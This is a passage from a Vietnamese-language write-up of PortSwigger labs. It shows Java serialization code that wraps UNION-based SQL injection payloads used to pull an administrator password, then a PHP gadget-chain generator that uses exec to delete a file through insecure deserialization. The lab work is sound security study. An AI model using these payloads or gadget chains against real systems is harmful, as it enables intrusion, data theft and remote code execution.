    public static void main(String[] args) throws IOException {
        ProductTemplate productTemplate = new ProductTemplate("<PAYLOAD>");
        Ser(productTemplate);
        ReadAndOut();
    }
    public static void Ser(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("test.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
    public static void ReadAndOut() throws IOException {
        File file = new File("test.txt");
        byte[] bytes = Files.readAllBytes(file.toPath());
        String output = Base64.getEncoder().encodeToString(bytes);
        output = URLEncoder.encode(output, "UTF-8");
        System.out.println(output);
    }
}
```
>Cấu trúc thư mục như sau: 
>![image](https://hackmd.io/_uploads/HkLcuM_LR.png)

>Biên dịch các file: ![image](https://hackmd.io/_uploads/Bk5sdM_8R.png)

>Lúc này, bài lab trở về dạng bài khai thác lỗ hổng SQL injection. Trước hết chúng ta xác nhận số lượng cột bằng error-based UNION attack. Payload:
>**`' UNION SELECT NULL--`**
![image](https://hackmd.io/_uploads/Hy_mKfuLC.png)

>Thay vào session, chúng ta nhận được lỗi trong response giá trị **`serialVersionUID`** không hợp lệ:
![image](https://hackmd.io/_uploads/SyVctfdIC.png)

>Bổ sung **`serialVersionUID`** vào lớp **`ProductTemplate`**: ![image](https://hackmd.io/_uploads/Bykm5M_IA.png)

>Chạy lại Main và thu được kết quả: ![image](https://hackmd.io/_uploads/S1zB9GdI0.png)

>Gửi lại request, lỗi xuất hiện cho thấy câu truy vấn sử dụng UNION không hoạt động là do số cột 2 bên không bằng nhau, chứng tỏ chúng ta có thể khai thác SQLi tại đây:
>![image](https://hackmd.io/_uploads/HkbU9GuUC.png)

>Tiếp tục tăng số cột lên, khi thử số cột bằng 8 thì không còn thông báo lỗi này nữa: 
>`' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL -- `
>![image](https://hackmd.io/_uploads/S1O7iGdLR.png)

>Xác định được có 8 cột, tiếp theo ta sẽ xác định kiểu dữ liệu,  kiểm tra kiểu dữ liệu của các cột có tương thích với string hay không và cột nào có thể hiển thị dữ liệu, payload:

**`' UNION SELECT 'a','b','c','d','e','f','g','h'--`**
![image](https://hackmd.io/_uploads/S1PhoM_UA.png)

>Như vậy chúng ta có thể khai thác dữ liệu từ cột thứ 4 4, và dữ liệu hiển thị phải ở dạng số (numberic). Chúng ta có thể sử dụng hàm **`CAST()`** để chuyển đổi.
Tìm kiếm tên bảng:

**`' UNION SELECT NULL,NULL,NULL,CAST(table_name AS numeric),NULL,NULL,NULL,NULL FROM information_schema.tables--`**
![image](https://hackmd.io/_uploads/S1aehfuLR.png)

>Thu được tên bảng **`users`**, tiếp tục tìm kiếm tên cột, payload:
**`' UNION SELECT NULL,NULL,NULL,CAST(column_name AS numeric),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users'--`**
![image](https://hackmd.io/_uploads/rJi7nGuI0.png)

>Thu được một cột có tên **`username`**, tìm kiếm tên cột khác **`username`**, payload:
**`' UNION SELECT NULL,NULL,NULL,CAST(column_name AS numeric),NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users' AND column_name != 'username'--`**
![image](https://hackmd.io/_uploads/HyPLnG_IR.png)

>Thu được cột có tên **`password`**. Tìm kiếm giá trị **`username`**, payload:
**`' UNION SELECT NULL,NULL,NULL,CAST(username AS numeric),NULL,NULL,NULL,NULL FROM users--`**
![image](https://hackmd.io/_uploads/HJvt3Mu8A.png)

>Có được 1 tài khoản với `username=administrator`. Tìm kiếm mật khẩu tài khoản **`administrator`**, payload:

**`' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users WHERE username = 'administrator'--`**
![image](https://hackmd.io/_uploads/ryKT3MdI0.png)

>Ta thu được mật khẩu của admin là `kjd95fofux3emitduzto`. Đăng nhập thành công vào trang quản trị của admin: ![image](https://hackmd.io/_uploads/ByXbpMd8A.png)

>Thực hiện xóa người dùng `carlos` và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ByTMpGO8R.png)

# **9. Lab: Developing a custom gadget chain for PHP deserialization**
>This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its [insecure deserialization](https://portswigger.net/web-security/deserialization) to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/Sk_Mmet8A.png)

>Đăng nhập vào `wiener` và thấy rằng session cookie là 1 object User đã được serialized: 
![image](https://hackmd.io/_uploads/r18bQgt8C.png)

>Trong source code có 1 đường dẫn bị lộ bên trong comment: ![image](https://hackmd.io/_uploads/ByedQxKLA.png)

>Khi truy cập đường dẫn này thì không trả về kết quả gì: ![image](https://hackmd.io/_uploads/r1PjQxYUR.png)

>Nhưng khi thêm `~` vào cuối URL, ta có thể truy cập vào xem 1 bản backup của file `CustomTemplate.php`: ![image](https://hackmd.io/_uploads/BywbEgFUA.png)

>Mã nguồn của code: 
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

>Đây là định nghĩa của class CustomTemplate kèm theo các class phụ khác. Ta sẽ phân tích như sau để tạo gadget chain:

>Một **DefaultMap** object khi gọi đến một thuộc tính không tồn tại hay inaccessible thì `__get($name)` được gọi → hàm `call_user_func($callback, $name)` được gọi.

>Mặt khác, khi một serialized **CustomTemplate** object được deserialize:
>* Hàm `__wakeup()` được gọi → Hàm `build_product()` được gọi
>* Tại hàm `build_product()` khởi tạo một object `Product($default_desc_type, $desc)` → Hàm `__construct()` của class Product được gọi → `$desc->$default_desc_type` được gọi.
>* Như vậy nếu như `$desc` là một DefaultMap object và `$default_desc_type `chính là tham số `$name` trong hàm `__get()`, thì `$desc->$default_desc_type` sẽ trở thành `call_user_func($callback, $default_desc_type)`;
>* Và khi đó, nếu callback là 1 hàm như eval hay exec, ta có thể thực thi lệnh OS với câu lệnh chính là `$default_desc_type`.
Dựa vào phân tích trên, ta tạo đoạn code generate payload như sau để xóa file `/home/carlos/morale.txt`:

```php
<?php

class DefaultMap {
    public $callback;
}

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

$b = new DefaultMap();
$b->callback = "exec";

$a = new CustomTemplate();
$a->default_desc_type = "rm /home/carlos/morale.txt";
$a->desc = $b;

$payload = serialize($a);
print_r($payload);
?>
```

>Run code và nhận lại được 1 gadget chain: ![image](https://hackmd.io/_uploads/rkGLFgKIC.png)

>Base64-encode gadget: ![image](https://hackmd.io/_uploads/HJxcKxt80.png)

>Thay giá trị vừa nhận vào session và Send: ![image](https://hackmd.io/_uploads/Hy3z5ltIR.png)

>Mặc dù server trả lỗi **500 Internal Server Error** nhưng lệnh vẫn được thực thi, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1CV9xKIR.png)
